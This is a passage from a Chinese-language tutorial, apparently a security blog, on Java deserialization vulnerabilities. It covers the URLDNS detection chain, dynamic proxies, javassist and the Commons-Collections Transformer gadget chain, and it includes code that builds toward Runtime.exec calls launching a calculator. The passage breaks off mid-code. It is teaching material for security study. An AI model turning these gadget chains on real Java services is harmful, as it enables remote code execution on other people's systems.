class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义反序列化类对象</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> ois 反序列化输入流对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException            IO异常</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 类未找到异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;readObject...&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用ObjectInputStream默认反序列化方法</span></span><br><span class="line">ois.defaultReadObject();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 省去调用自定义反序列化逻辑...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义序列化类对象</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> oos 序列化输出流对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException IO异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream oos)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">oos.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;writeObject...&quot;</span>);</span><br><span class="line"><span class="comment">// 省去调用自定义序列化逻辑...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObjectNoData</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;readObjectNoData...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 写入时替换对象</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 替换后的对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">writeReplace</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;writeReplace....&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">readResolve</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;readResolve....&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>当我们对<code>DeserializationTest</code>类进行序列化操作时，会自动调用(反射调用)该类的<code>writeObject(ObjectOutputStream oos)</code>方法,对其进行反序列化操作时也会自动调用该类的<code>readObject(ObjectInputStream)</code>方法，也就是说我们可以通过在待<strong>序列化或反序列化的类中定义<code>readObject</code>和<code>writeObject</code>方法，来实现自定义的序列化和反序列化操作</strong>，当然前提是，被序列化的类必须有此方法，并且方法的修饰符必须是<code>private</code>。</p></blockquote><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p><code>URLDNS</code>是一个非常经典的反序列化链。适合用于检测反序列化漏洞，但不能攻击</p><ul><li>使用Java内置的类构造，对第三方库没有依赖</li><li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li></ul><p>调用链</p><p>HashMap.readObject() -&gt; HashMap.hash() -&gt; java.net.URL.hashCode() -&gt; URLStreamHandler.hashCode() -&gt; URLStreamHandler.getHostAddress() -&gt; InetAddress.getByName()</p><blockquote><blockquote><p>public static InetAddress getByName(String host) throws UnknownHostException<br>确定主机名称的IP地址。<br>主机名称可以是机器名称，例如“ java.sun.com ”或其IP地址的文本表示。 如果提供了文字IP地址，则只会检查地址格式的有效性。</p></blockquote><p><code>java.util.HashMap</code> 实现了 <code>Serializable</code> 接口，重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode(需要先设置成-1). 而 <code>java.net.URL</code> 的 <code>hashCode</code> 在计算时会调用 <code>getHostAddress</code> 来解析域名，从而发出 DNS 请求。</p></blockquote><blockquote><p>在目标没有回显的时候,可以确定目标系统上是否存在可控的 <code>readObject()</code> 方法</p></blockquote><h2 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h2><p>动态代理比较常见的用处就是：<strong>在不修改类的源码的情况下,通过代理的方式为类的方法提供更多的功能</strong></p><p>举个例子来说（这个例子在开发中很常见）：我的开发们实现了业务部分的所有代码，忽然我期望在这些业务代码中多添加日志记录功能的时候，一个一个类去添加代码就会非常麻烦，这个时候我们就能通过动态代理的方式对期待添加日志的类进行代理。</p><p>看一个简单的demo：</p><p>Work接口需要实现work函数</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Work</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">work</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>Teacher类实现了Work接口</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">implements</span> <span class="title class_">Work</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">work</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;my work is teach students&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Teacher&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>WorkHandler用来处理被代理对象，它必须继承InvocationHandler接口，并实现invoke方法</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WorkHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    <span class="comment">//代理类中的真实对象</span></span><br><span class="line">    <span class="keyword">private</span> Object obj;</span><br><span class="line">    <span class="comment">//构造函数，给我们的真实对象赋值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WorkHandler</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.obj = obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">//在真实的对象执行之前我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before invoke。。。&quot;</span>);</span><br><span class="line">        <span class="comment">//java的反射功能，用来调用obj对象的method方法，传入参数为args</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">invoke</span> <span class="operator">=</span> method.invoke(obj, args);</span><br><span class="line">        <span class="comment">//在真实的对象执行之后我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after invoke。。。&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> invoke;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在Test类中通过Proxy.newProxyInstance进行动态代理，这样当我们调用代理对象proxy对象的work方法的时候，<strong>实际上调用的是WorkHandler的invoke方法</strong>。</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//要代理的真实对象</span></span><br><span class="line">        <span class="type">Work</span> <span class="variable">people</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Teacher</span>();</span><br><span class="line">        <span class="comment">//代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中，最终代理对象的调用处理程序会调用真实对象的方法</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WorkHandler</span>(people);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 通过Proxy类的newProxyInstance方法创建代理对象，我们来看下方法中的参数</span></span><br><span class="line"><span class="comment">         * 第一个参数：people.getClass().getClassLoader()，使用handler对象的classloader对象来加载我们的代理对象</span></span><br><span class="line"><span class="comment">         * 第二个参数：people.getClass().getInterfaces()，这里为代理类提供的接口是真实对象实现的接口，这样代理对象就能像真实对象一样调用接口中的所有方法</span></span><br><span class="line"><span class="comment">         * 第三个参数：handler，我们将代理对象关联到上面的InvocationHandler对象上</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Work</span> <span class="variable">proxy</span> <span class="operator">=</span> (Work)Proxy.newProxyInstance(handler.getClass().getClassLoader(), people.getClass().getInterfaces(), handler);</span><br><span class="line">        System.out.println(proxy.work());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>看一下输出结果，我们再没有改变Teacher类的前提下通过代理Work接口，实现了work函数调用的重写。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">before invoke。。。</span><br><span class="line">my work is teach students</span><br><span class="line">after invoke。。。</span><br><span class="line">Teacher</span><br></pre></td></tr></table></figure></div><h2 id="javassist动态编程"><a href="#javassist动态编程" class="headerlink" title="javassist动态编程"></a>javassist动态编程</h2><p>ysoserial中基本上所有的恶意object都是通过动态编程的方式生成的，通过这种方式我们可以直接对已经存在的java文件字节码进行操作，也可以在内存中动态生成Java代码，动态编译执行，关于这样做的好处，作者在工具中也有提到：</p><p>could also do fun things like injecting a pure-java rev&#x2F;bind-shell to bypass naive protections</p><p>关于javassist动态编程，我就只把关键的函数及其功能罗列一下了</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取默认类池，只有在这个ClassPool里面已经加载的类，才能使用</span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="comment">//获取pool中的某个类</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;test.Teacher&quot;</span>);</span><br><span class="line"><span class="comment">//为cc类设置父类</span></span><br><span class="line">cc.setSuperclass(pool.get(<span class="string">&quot;test.People&quot;</span>));</span><br><span class="line"><span class="comment">//将动态生成类的class文件存储到path路径下</span></span><br><span class="line">cc.writeFile(path);</span><br><span class="line"><span class="comment">//获取类的字节码</span></span><br><span class="line"><span class="type">byte</span>[] b=cc.toBytecode();</span><br><span class="line"><span class="comment">//创造Point类</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line"><span class="comment">//为cc类添加成员变量</span></span><br><span class="line">cc.addField(f);</span><br><span class="line"><span class="comment">//为cc类添加方法</span></span><br><span class="line">cc.addMethod(m);</span><br><span class="line"><span class="comment">//为cc类设置类名</span></span><br><span class="line">cc.setName(<span class="string">&quot;Pair&quot;</span>);</span><br></pre></td></tr></table></figure></div><h2 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h2><p><a class="link"   href="https://xz.aliyun.com/t/9409#toc-2" >CC链 1-7 分析 - 先知社区 (aliyun.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>CC链（Commons-Collections）中非常重要的就是几个Transformer类、HashMap、HashSet、HashTable、LazyMap、TiedMapEntry、BadAttributeValueExpException、AnnotationInvocationHandler、Proxy.newProxyInstance，看着好像很多有点唬人，其实理解之后会发现都不是大问题，特别是看过这些类的源码之后，每个利用链就会很清晰。</p><p>CC链的利用条件存在一些限制，主要表现为:</p><ul><li>jdk8u71之前可以使用AnnotationInvocationHandler作为前段，之后不行</li><li>jdk7低版本中无法使用CC5(BadAttributeValueExpException不存在readObject)</li><li>commons-collections3.x可以使用LazyMap.decorate作为前段，之后不行</li><li>commons-collections4.0之后可以直接回调PriorityQueue作为前段，之前不行</li></ul><p>先介绍几个里面调用到的类</p><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>该类实现了Transformer接口，并重写了tranform方法，用于获取一个对象，它的过程就是在构造函数的时候传入一个对象，并在transform方法将这个对象再返回：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取对象</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>该类实现了Transformer接口，并重写了tranform方法，其 transform 方法作用是反射调用指定的方法并返回方法调用结果，关键代码如下：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8653385846894047688L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重写的 transform 方法，反射调用指定的方法并返回方法调用结果</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> …………</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>弹计算器</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">     <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;);</span><br><span class="line">     transformer.transform(Runtime.getRuntime());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote><h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h4><p>其 transform 方法作用是反射调用构造函数将类实例化，关键代码如下：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InstantiateTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3786388740793356347L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">NO_ARG_INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重写的 transform 方法，反射调用构造函数将类实例化。</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>测试</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Student 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name)</span> &#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;学生姓名:&quot;</span> + name);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试 InstantiateTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">     <span class="type">Transformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;小明&quot;</span>&#125;);</span><br><span class="line">     instantiateTransformer.transform(Student.class);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//学生姓名:小明</span></span><br></pre></td></tr></table></figure></div></blockquote><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>其 transform 方法作用是实现数组链式调用。我们只需传入一个 Transformer[] 给 ChainedTransformer，然后执行 ChainedTransformer 的 transform 方法便可以链式调用 Transformer[] 中每个 Transformer 的 transform 方法。</p><p>将内部的多个Transformer串在一起。通俗来说就是，前一个回调transform方法返回的结果，作为后一个回调transform方法的参数传入</p><p>关键代码如下：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3514945074733160196L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重写的 transform 方法，链式调用  Transformer[] 中每个 Transformer 的 transform 方法</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>测试 利用 ChainedTransformer 实现 Runtime.<em>getRuntime</em>().exec(“calc”) ）</p><p>因为Runtime类没有实现Serializable，所以只能通过class一步步构造</p><p>getRuntime()方法可以获取与之相关的Runtime对象</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime();</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 测试 ChainedTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">     <span class="comment">//Transformer数组</span></span><br><span class="line">     Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),<span class="comment">//用getMethod得到getRuntime，因为getRuntime没有参数，所以传了个new Class[0]</span></span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span 